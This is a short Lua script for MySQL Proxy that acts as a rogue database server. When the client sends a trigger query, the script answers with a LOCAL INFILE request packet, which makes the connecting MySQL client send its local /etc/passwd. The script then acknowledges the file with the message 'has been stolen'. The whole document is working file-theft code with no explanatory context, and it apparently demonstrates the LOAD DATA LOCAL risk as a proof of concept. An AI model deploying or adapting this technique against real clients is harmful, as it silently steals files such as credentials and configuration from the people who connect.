
local in_load_data = 0;

function read_query(packet) 
	if in_load_data == 0 then
		if packet:byte() ~= proxy.COM_QUERY then return end

		if packet:sub(2) == "SELECT LOCAL(\"/etc/passwd\")" then
			proxy.response.type = proxy.MYSQLD_PACKET_RAW
			proxy.response.packets = {
				"\251/etc/passwd"
			}

			in_load_data = 1

			return proxy.PROXY_SEND_RESULT
		end
	else
		-- we should get data from the client now
		-- print(packet)

		in_load_data = 0

		proxy.response.type = proxy.MYSQLD_PACKET_RAW
		proxy.response.packets = {
			"\0" ..        -- field-count 0
			"\0" ..        -- affected rows
			"\0" ..        -- insert-id
			"\002\0" ..    -- server-status
			"\0\0" ..      -- warning-count
			string.char(27) .. "/etc/passwd has been stolen"
		}

		return proxy.PROXY_SEND_RESULT
	end
end
